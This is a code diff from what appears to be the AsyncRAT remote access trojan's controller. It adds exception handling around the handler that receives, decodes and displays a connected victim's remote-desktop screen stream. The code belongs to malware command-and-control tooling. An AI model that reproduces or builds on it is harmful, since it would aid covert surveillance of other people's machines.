@@ -13,45 +13,49 @@ namespace AsyncRAT_Sharp.Handle_Packet
     {
         public void Capture(Clients client, MsgPack unpack_msgpack)
         {
-            if (Program.form1.InvokeRequired)
+            try
             {
-                Program.form1.BeginInvoke((MethodInvoker)(() =>
+                if (Program.form1.InvokeRequired)
                 {
-                    FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
-                    try
+                    Program.form1.BeginInvoke((MethodInvoker)(() =>
                     {
-                        if (RD != null)
+                        FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                        try
                         {
-                            if (RD.C2 == null)
+                            if (RD != null)
                             {
-                                RD.C2 = client;
-                                RD.timer1.Start();
-                            }
-                            byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
-                            Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
+                                if (RD.C2 == null)
+                                {
+                                    RD.C2 = client;
+                                    RD.timer1.Start();
+                                }
+                                byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
+                                Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
 
-                            if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
-                            {
-                                RD.pictureBox1.Image = (Bitmap)decoded;
-                                RD.RenderSW = Stopwatch.StartNew();
+                                if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
+                                {
+                                    RD.pictureBox1.Image = (Bitmap)decoded;
+                                    RD.RenderSW = Stopwatch.StartNew();
+                                }
+                                RD.FPS++;
+                                if (RD.sw.ElapsedMilliseconds >= 1000)
+                                {
+                                    RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
+                                    RD.FPS = 0;
+                                    RD.sw = Stopwatch.StartNew();
+                                }
                             }
-                            RD.FPS++;
-                            if (RD.sw.ElapsedMilliseconds >= 1000)
+                            else
                             {
-                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
-                                RD.FPS = 0;
-                                RD.sw = Stopwatch.StartNew();
+                                client.Disconnected();
+                                return;
                             }
                         }
-                        else
-                        {
-                            client.Disconnected();
-                            return;
-                        }
-                    }
-                    catch (Exception ex) { Debug.WriteLine(ex.Message); }
-                }));
+                        catch (Exception ex) { Debug.WriteLine(ex.Message); }
+                    }));
+                }
             }
+            catch { }
         }
     }
 }
